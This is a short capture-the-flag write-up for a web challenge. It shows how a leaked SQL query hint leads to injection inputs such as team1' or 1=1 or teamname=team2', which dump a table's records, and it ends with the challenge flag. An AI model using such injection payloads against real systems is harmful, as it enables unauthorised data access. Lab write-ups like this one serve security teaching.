# Darkwhatever coin
http://chal.firebird.sh:32001/q1/

1. Try some input: team1
![alt text](https://github.com/div1121/OIL_Test/blob/main/Darkwhatever_coin/img1.png)

- After the input, we can see the SQL as hint:　
```
<!-- SELECT teamname, balance FROM balances WHERE teamname='team1' -->
```

2. Instead of team1, we can try to insert extra items at the end of SQL
- Try another input: team1' or teamname=team2'
![alt text](https://github.com/div1121/OIL_Test/blob/main/Darkwhatever_coin/img4.png)

- After the input, we can see it displays team1 and team2

3. For SQL where clause, we can put a statement in between to make it always TRUE, thus the SQL statment can display all records in the table
- Input: team1' or 1=1 or teamname=team2'
![alt text](https://github.com/div1121/OIL_Test/blob/main/Darkwhatever_coin/img5.png)

Flag obtained:
flag{Sqli_1s_s1mple_uq6rR2U6Ad}
